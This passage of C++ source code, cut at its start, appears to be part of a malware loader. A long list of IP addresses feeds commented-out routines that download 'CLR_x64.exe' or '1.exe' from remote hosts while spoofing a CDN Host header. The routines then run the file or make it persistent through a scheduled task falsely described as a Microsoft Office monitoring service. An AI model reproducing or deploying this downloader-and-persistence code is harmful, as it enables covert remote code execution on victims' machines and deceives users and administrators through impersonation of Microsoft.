2.202.238","101.72.202.237","101.72.205.122","101.72.205.120","101.72.205.112","101.72.205.113","101.72.205.119","101.72.205.123","101.72.202.205","101.72.205.245","101.72.205.244","101.72.205.241","101.72.205.248","101.72.205.250","101.72.205.240","101.72.205.242","101.72.205.239","101.72.205.246","101.72.205.251","101.72.205.249","101.72.205.243","101.72.205.78","101.72.205.79","101.72.205.84","101.72.205.81","101.72.205.80","101.72.205.87","101.72.205.85","101.72.206.143","101.72.205.86","101.72.206.144","101.72.206.145","101.72.206.198","101.72.206.179","101.72.206.208","101.72.206.199","101.72.206.204","101.72.206.210","101.72.206.217","101.72.206.238","101.72.206.209","101.72.206.239","101.72.206.180","101.72.206.248","101.72.206.146","101.72.206.216","101.72.206.205","101.72.206.249","101.72.206.252","101.72.212.109","101.72.206.211","101.72.206.214","101.72.212.106","101.72.212.108","101.72.212.105","101.72.212.104","101.72.212.111","101.72.212.110","101.72.212.107","101.72.206.251","101.72.206.215","101.72.254.184","101.72.254.176","101.72.254.177","101.72.254.134","101.72.254.135","101.72.254.137","101.72.254.183","101.72.254.154","101.72.254.136","101.72.254.186","101.72.254.155","101.72.254.153","101.72.254.187","101.72.254.152","101.89.100.214","101.89.100.210","101.89.100.232","101.89.100.233","101.89.100.236","101.89.100.211","101.89.100.213","101.89.100.234","101.89.100.238","101.89.100.216","101.89.100.212","101.89.100.239","101.89.100.237","101.89.100.235","101.89.101.120","101.89.101.123","101.89.101.114","101.89.100.217","101.89.101.113","101.89.100.215","101.89.101.124","101.89.101.121","101.89.101.89","101.89.101.90","101.89.101.91","101.89.101.92","101.89.124.183","101.89.124.191","101.89.124.192","101.89.124.200","101.89.124.225","101.89.124.226","101.89.124.232","101.89.124.233","101.89.124.238","101.89.124.236","101.89.124.184","101.89.124.201","101.89.124.199","101.89.124.179","101.89.124.235","101.89.124.202","101.89.124.176","101.89.124.175","101.89.124.180","101.89.125.218","101.89.125.219","101.89.125.216","101.89.125.192","101.89.125.193","101.89.125.194","101.89.125.199","101.89.125.235","101.89.125.217","101.89.125.236","101.89.125.248","101.89.125.252","101.89.125.253","101.89.125.244","101.89.125.178","103.1.171.113","103.1.171.121","103.1.171.114","103.1.171.123","103.1.171.120","103.1.171.98","103.1.171.97","103.1.171.124","103.15.99.103","103.15.99.104","103.15.99.106","103.15.99.107","103.15.99.114","103.15.99.115","103.15.99.58","103.15.99.59","103.120.247.252","103.120.247.209","103.120.247.249","103.15.99.66","103.15.99.67","103.15.99.68","103.15.99.69","103.15.99.96","103.15.99.97","103.220.67.56","103.220.67.54","103.220.67.55","103.220.67.57","103.220.67.53","103.220.67.59","103.220.67.58","103.220.67.52" };

			//for (string lin : line) {

			//	string url = "https://";

			//	url.append(lin);
			//	url.append("/static/CLR/CLR_x64.exe");
			//	const char* str2 = url.c_str();

			//	printf("[+] %s\n",str2);


			//	char local_file[128] = { 0 };

			//	sprintf(local_file, "./clr.exe");

			//	int downFlag = HttpTools::download_file(str2, local_file,cdnHost.c_str());

			//	if (downFlag < 0) {
			//		printf("[+] C++ Download Error!\n");
			//	}
			//	else
			//	{
			//		printf("[+] C++ Download Success!\n");

			//		//追加时间戳
			//		Common::addTimestamp("clr.exe");
			//		
			//		CMyTaskSchedule task2;
			//		BOOL flag2 = FALSE;

			//		flag2 = task2.NewTask("Office Service Monitor2", "clr.exe", "", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");

			//		if (FALSE == flag2)
			//		{
			//			printf("[-] Create Task Schedule Error!\n");
			//			Common::exec("clr.exe", FALSE);
			//		}
			//		else {
			//			printf("[+] Create Task Schedule Success!\n");
			//		}
			//		break;
			//	}
			//}


			//下载文件


			//string strURL = "https://1.180.27.205/static/CLR/1.exe";
			//char local_file[50] = { 0 };

			//sprintf(local_file, "./1.exe");

			//int downFlag = HttpTools::download_file(strURL.c_str(), local_file);

			//if (downFlag < 0) {
			//	printf("[+] C++ Download Error!\n");
			//}
			//else
			//{
			//	printf("[+] C++ Download Success!\n");
			//}
		}


		




		//CMyTaskSchedule task;
		//BOOL flag = FALSE;


		//// 创建 任务计划
		////任务名称，启动程序路径，，设置作者信息
		//flag = task.NewTask("Office Service Monitor", "C:\\tester.exe","", "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.");
		//if (FALSE == flag)
		//{
		//	printf("Create Task Schedule Error!\n");
		//}
		//else {
		//	printf("Create Task Schedule Success!\n");
		//}

		//// 暂停
		//printf("Create Task Schedule OK!\n");
		//system("pause");

		//// 卸载 任务计划
		//bRet = task.Delete("520");
		//if (FALSE == bRet)
		//{
		//	printf("Delete Task Schedule Error!\n");
		//}

		//printf("Delete Task Schedule OK!\n");
		//system("pause");
	}
	catch (exception e)
	{
		Common::logReport(e.what());
		exit(0);
	}
	return 0;
}